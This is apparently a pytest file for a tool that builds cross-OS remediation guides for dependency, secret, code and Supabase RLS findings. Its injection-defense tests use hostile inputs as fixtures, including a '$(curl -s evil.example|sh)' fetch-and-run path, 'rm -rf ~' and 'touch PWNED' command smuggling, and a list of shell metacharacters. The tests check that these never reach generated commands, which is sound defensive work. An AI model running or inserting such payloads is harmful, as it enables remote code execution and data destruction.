"""세 OS 대응 가이드와 명령 안전성."""

import pytest

from app.llm.pipeline import Explainer
from app.llm.remediation import build_guide, detect_package_manager
from app.llm.schemas import FindingInput
from tests.conftest import blue_draft

pytestmark = pytest.mark.anyio


def dep(lockfile: str, ecosystem: str = "npm", target: str | None = "4.17.21", package: str = "lodash") -> FindingInput:
    return FindingInput(
        fingerprint="d1",
        tool="osv",
        category="dependency",
        rule_id="CVE-2021-23337",
        title="lodash 취약점",
        severity="high",
        file_path=lockfile,
        package_name=package,
        package_ecosystem=ecosystem,
        installed_version="4.17.15",
        fixed_version=target,
    )


def secret(path: str = "src/lib/supabase.ts", rule: str = "supabase-service-role-key") -> FindingInput:
    return FindingInput(
        fingerprint="s1", tool="gitleaks", category="secret", rule_id=rule, title="키 노출", severity="critical", file_path=path
    )


def action(guide, action_id):
    return next(a for a in guide.actions if a.id == action_id)


def lines(act, os_):
    return next(b.lines for b in act.commands if b.os == os_)


@pytest.mark.parametrize(
    ("lockfile", "ecosystem", "expected"),
    [
        ("package-lock.json", "npm", "npm"),
        ("web/pnpm-lock.yaml", "npm", "pnpm"),
        ("yarn.lock", "npm", "yarn"),
        ("bun.lockb", "npm", "bun"),
        ("requirements.txt", "PyPI", "pip"),
        ("uv.lock", "PyPI", "uv"),
        ("poetry.lock", "PyPI", "poetry"),
        ("composer.lock", "Packagist", "composer"),
        ("Gemfile.lock", "RubyGems", "bundler"),
        ("go.sum", "Go", "go"),
        ("Cargo.lock", "crates.io", "cargo"),
        ("unknown.lock", "PyPI", "pip"),  # 파일로 모르면 생태계로
    ],
)
def test_package_manager_detection(lockfile, ecosystem, expected):
    assert detect_package_manager(dep(lockfile, ecosystem)) == expected


def test_npm_upgrade_for_every_os():
    guide = build_guide(dep("package-lock.json"))

    up = action(guide, "upgrade_dependency")
    assert {b.os for b in up.commands} == {"windows", "macos", "linux"}
    assert {b.shell for b in up.commands} == {"powershell", "zsh", "bash"}
    assert lines(up, "windows") == ["npm install lodash@4.17.21"]
    assert lines(action(guide, "commit_lockfile"), "linux")[0] == "git add package-lock.json"


def test_pip_uses_py_launcher_on_windows():
    guide = build_guide(dep("requirements.txt", "PyPI", package="django", target="4.2.16"))

    up = action(guide, "upgrade_dependency")
    assert lines(up, "windows") == ["py -m pip install 'django>=4.2.16'"]
    assert lines(up, "macos") == ["python3 -m pip install 'django>=4.2.16'"]
    assert any("requirements.txt" in m for m in up.manual_steps)


def test_no_fixed_version_has_no_commands():
    guide = build_guide(dep("package-lock.json", target=None))

    assert guide.actions[0].id == "no_fixed_version"
    assert not guide.actions[0].commands


def test_secret_guide_rotates_first_with_console_link():
    guide = build_guide(secret())

    assert guide.actions[0].id == "rotate_secret"
    assert "https://supabase.com/dashboard/project/_/settings/api-keys" in guide.actions[0].links
    env = action(guide, "move_to_env")
    assert "SUPABASE_SERVICE_ROLE_KEY" in env.title
    assert action(guide, "purge_history").optional is True


def test_windows_commands_are_powershell_51_safe():
    guide = build_guide(secret())

    script = "\n".join(line for a in guide.actions for b in a.commands if b.os == "windows" for line in b.lines)
    for unix_only in ("rm -rf", "&&", "grep ", "echo '", "export ", "python3"):
        assert unix_only not in script, unix_only
    assert "Add-Content" in script and "Select-String" in script


def test_secret_values_never_appear_in_commands():
    guide = build_guide(secret())

    script = "\n".join(line for a in guide.actions for b in a.commands for line in b.lines)
    assert "<새로 발급한 값>" in script  # 자리표시자만, 실제 값은 편집기로


def test_secret_guide_includes_platform_independent_deployment_step():
    guide = build_guide(secret())
    steps = [step for a in guide.actions for step in a.manual_steps]
    assert "배포 환경(호스팅)의 환경 변수도 새 키로 바꾸고 다시 배포하세요." in steps


def test_committed_env_file_is_untracked():
    guide = build_guide(secret(path=".env.local", rule="generic-api-key"))

    assert lines(action(guide, "stop_tracking_env"), "windows")[0] == "git rm --cached .env.local"


def test_rls_sql_uses_table_names_from_snippet():
    f = FindingInput(
        fingerprint="c1",
        tool="own-checker",
        category="config",
        rule_id="vibe.supabase.rls-disabled",
        title="RLS 꺼짐",
        severity="high",
        snippet="create table public.customers (id uuid);\ncreate table if not exists orders (id uuid);\ncreate table x; drop table y",
    )

    sql = action(build_guide(f), "enable_rls").manual_steps

    assert "alter table public.customers enable row level security;" in sql
    assert "alter table public.orders enable row level security;" in sql
    assert not any("drop" in s for s in sql)


def test_code_finding_gets_optional_branch_and_rescan():
    f = FindingInput(
        fingerprint="x", tool="semgrep", category="code", rule_id="vibe.nextjs.sql-injection-template-literal",
        title="SQL", severity="high",
    )  # fmt: skip

    guide = build_guide(f)

    branch = action(guide, "work_branch")
    assert branch.optional and lines(branch, "linux") == ["git switch -c fix/vibe-nextjs-sql-injection-template"]
    assert guide.actions[-1].id == "rescan"


async def test_all_os_guide_reaches_prompt_and_result(fake_vllm, findings):
    fake_vllm.queue("BlueDraft", blue_draft())

    result = await Explainer(fake_vllm.client()).blue(findings[3])

    prompt = fake_vllm.calls("BlueDraft")[0]["messages"][-1]["content"]
    assert "<actions>" in prompt and "upgrade_dependency" in prompt
    assert "npm install next@15.2.3" not in prompt  # 명령 자체는 모델에 넘기지 않음
    assert set(result.guide.model_dump()) == {"package_manager", "actions"}
    assert {b.os for a in result.guide.actions for b in a.commands} == {"windows", "macos", "linux"}
    assert lines(action(result.guide, "upgrade_dependency"), "windows") == ["npm install next@15.2.3"]


# ── 명령 주입 방어 (#35 리뷰) ──

HOSTILE = ["$(", "`", ";", "|", "&", ">", "<"]


def all_command_text(guide) -> str:
    return "\n".join(line for a in guide.actions for b in a.commands for line in b.lines)


def test_review_repro_lockfile_path_is_not_executed():
    f = dep("web$(curl -s evil.example|sh)/package-lock.json")

    guide = build_guide(f)

    commit = action(guide, "commit_lockfile")
    assert not commit.commands and commit.manual_steps
    assert "$(" not in all_command_text(guide)


def test_review_repro_env_path_is_not_executed():
    guide = build_guide(secret(path="cfg;touch PWNED;/.env", rule="generic-api-key"))

    untrack = action(guide, "stop_tracking_env")
    assert not untrack.commands and untrack.manual_steps
    assert "PWNED" not in all_command_text(guide)


@pytest.mark.parametrize(
    ("package", "version"),
    [
        ("lodash;rm -rf ~", "4.17.21"),
        ("lodash", "4.17.21$(id)"),
        ("-g", "1.0.0"),  # 옵션으로 해석되는 인자 주입
        ("lodash`id`", "1.0.0"),
    ],
)
def test_hostile_package_or_version_gets_no_commands(package, version):
    guide = build_guide(dep("package-lock.json", package=package, target=version))

    assert guide.actions[0].id == "upgrade_dependency_manual"
    text = all_command_text(guide)
    assert not any(h in text for h in HOSTILE)
    assert "-g" not in text.split()


def test_scoped_package_is_quoted_for_powershell():
    guide = build_guide(dep("package-lock.json", package="@supabase/supabase-js", target="2.45.0"))

    up = action(guide, "upgrade_dependency")
    # '@' 로 시작하는 인자는 PowerShell 에서 일관되게 인용합니다 ('@이름' 은 splatting 으로 사라짐)
    assert lines(up, "windows") == ["npm install '@supabase/supabase-js@2.45.0'"]
    assert lines(up, "linux") == ["npm install @supabase/supabase-js@2.45.0"]


def test_paths_with_spaces_are_not_turned_into_commands():
    guide = build_guide(dep("my app/package-lock.json"))

    assert not action(guide, "commit_lockfile").commands


@pytest.mark.parametrize("payload", ["x;touch PWNED", "x$(touch PWNED)", "x`touch PWNED`", "x|touch PWNED", "x' ; touch PWNED ; '"])
def test_untrusted_fields_never_reach_commands(payload):
    """탐지 결과에서 오는 모든 칸에 공격 문자열을 넣어도 명령에는 나타나지 않아야 합니다."""
    cases = [
        dep(f"{payload}/package-lock.json"),
        dep("package-lock.json", package=payload),
        dep("package-lock.json", target=payload),
        secret(path=f"{payload}/.env"),
        secret(rule=payload),
        FindingInput(
            fingerprint="c", tool="semgrep", category="code", rule_id=payload, title="t", severity="high",
        ),  # fmt: skip
        FindingInput(
            fingerprint="r", tool="own", category="config", rule_id="rls-disabled", title="RLS", severity="high",
            snippet=f"create table {payload} (id int);",
        ),  # fmt: skip
    ]
    for f in cases:
        guide = build_guide(f)
        # 규칙 ID는 안전한 환경 변수 이름으로만 변환합니다. 세 OS 명령 모두 검사합니다.
        assert "touch PWNED" not in all_command_text(guide), f.fingerprint
        sql = [m for a in guide.actions for m in a.manual_steps if m.startswith("alter table")]
        assert not any("touch PWNED" in line for line in sql)
